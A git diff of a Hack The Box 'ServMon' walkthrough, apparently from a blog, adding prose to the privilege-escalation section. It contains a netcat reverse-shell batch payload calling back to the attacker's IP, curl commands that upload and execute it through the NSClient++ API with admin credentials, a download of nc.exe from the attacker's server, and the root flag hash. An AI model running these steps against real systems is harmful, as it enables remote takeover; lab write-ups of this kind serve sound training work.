@@ -593,7 +593,7 @@ The web portal seemed somewhat complicated to interact with, and the instruction
 
 ### Taking the API route
 
-[https://docs.nsclient.org/api/scripts/](https://docs.nsclient.org/api/scripts/)
+While reading through the API documentation at [https://docs.nsclient.org/api/scripts/](https://docs.nsclient.org/api/scripts/) I thought it sounded like a much easier to deal with route than going through the web portal.  With just two simple commands I could upload my script and execute a query against that script to get it to run. The documentation even gave specifics on how to upload the contents of the script by passing it as a string in the command, rather than actually creating and sending a file.
 
 ```text
 Example¶
@@ -609,16 +609,32 @@ curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/che
 Added check_new as scripts\check_new.bat
 ```
 
+For my payload script I still used the one recommended by the exploit author, even though I was sending it to the server by a different method.  It was a very simple netcat reverse shell..
+
 ```text
 #@echo off
 c:\Temp\nc.exe 10.10.14.15 4443 -e cmd.exe
 ```
 
-nadine@SERVMON C:\Users\Nadine&gt;curl -k -u admin [https://localhost:8443/api/v1](https://localhost:8443/api/v1) Enter host password for user 'admin': curl: \(7\) Failed to connect to localhost port 8443: Connection refused
+To send the payload to the server I used `curl` as specified by the documentation and sent the contents of my payload script as `--data-binary "<string>"`.   It prompted me to enter the admin password we had retrieved from the nscp client.  
 
-nadine@SERVMON C:\Temp&gt;curl -s -k -u admin -X PUT [https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat](https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat) --data-binary "C:\Temp\nc.exe 10.10.15.20 12345 -e cmd.exe" Enter host password for user 'admin': Added evil as scripts\evil.bat
+```text
+nadine@SERVMON C:\Temp>curl -s -k -u admin -X PUT \
+ https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat \
+ --data-binary "C:\Temp\nc.exe 10.10.15.20 12345 -e cmd.exe" 
 
-nadine@SERVMON C:\Users\Nadine&gt;curl -s -k -u admin [https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=1m](https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=5m)
+ Enter host password for user 'admin': 
+ Added evil as scripts\evil.bat
+```
+
+After sending the script it let me know that it had added the script under the name `evil`.  This is the name to use to run a query against it in order to run it.
+
+```text
+nadine@SERVMON C:\Users\Nadine>curl -s -k -u admin \
+ https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=1m
+```
+
+At first, I tried executing the script but I didn't receive a reverse shell.  I realized after doing a bit of troubleshooting that I hadn't actually uploaded `nc.exe` to the remote host. My command to transfer the file had not completed successfully, but I had missed the error message it gave in my rush to finish since it was well past my bedtime. _Let this be a lesson to always take your time and pay attention to details, no matter how tired or in a hurry you may be :\)_
 
 ```text
 nadine@SERVMON C:\Temp>curl http://10.10.15.20:8090/nc.exe
@@ -644,13 +660,19 @@ nadine@SERVMON C:\Temp>dir
                2 File(s)         59,392 bytes
                2 Dir(s)  27,866,644,480 bytes free
 
-nadine@SERVMON C:\Temp>curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=5m
+```
+
+I was not the only to make mistakes while transferring files to this machine.  Another user had tried to upload `nc.exe` \(_I overwrote this_\) and their `evil.bat` to the `C:\Temp` folder but had failed \(_file size of 0 bytes seen above_\).  I figured out that had forgotten to add `--output <file_name>` at first.  Luckily it gave a warning to remind me of this.  
+
+```text
+nadine@SERVMON C:\Temp>curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=1m
 Enter host password for user 'admin':
+
 {"command":"evil","lines":[{"message":"Command evil didn't terminate within the timeout period 60s","pe
 rf":{}}],"result":3}
 ```
 
-I was not the only one to have troubles at first transferring my files to this machine.  Another user had tried to upload `nc.exe` and `evil.bat` to the `C:\Temp` folder but had failed \(filesize of 0 bytes\).  I had forgotten to add `--output <file_name>` .  Luckily it gave a warning to remind me of this.  
+Despite the error message seen above, once I successfully uploaded `nc.exe` to the folder I had specified in my payload `C:\Temp`, and then sent the execute query once again, I received my reverse shell on my host machine.  The error message above I believe is to let an administrator know that there was a long-running script that did not terminate within the specified timeout period.  
 
 ### Getting a root shell
 
@@ -720,16 +742,21 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 ERROR: Unable to get user claims information.
 ```
 
+Bam!  Now I was logged in as `nt authority\system` and had full control of the system.
+
 ### root.txt
 
-Apparently in a cmd.exe shell the direction of the slash is important when using `type` to read a file!
+The last thing to do was, of course_,_ to collect my proof.  
 
 ```text
-
 C:\Program Files\NSClient++>type C:/Users/Administrator/Desktop/root.txt
 type C:/Users/Administrator/Desktop/root.txt
 The syntax of the command is incorrect.
+```
 
+_Oops. Apparently in a `cmd.exe` shell the direction of the slash is important when using `type` to read a file!_
+
+```text
 C:\Program Files\NSClient++>type C:\Users\Administrator\Desktop\root.txt
 type C:\Users\Administrator\Desktop\root.txt
 3e42dab90f3ab8487973c7769382a639
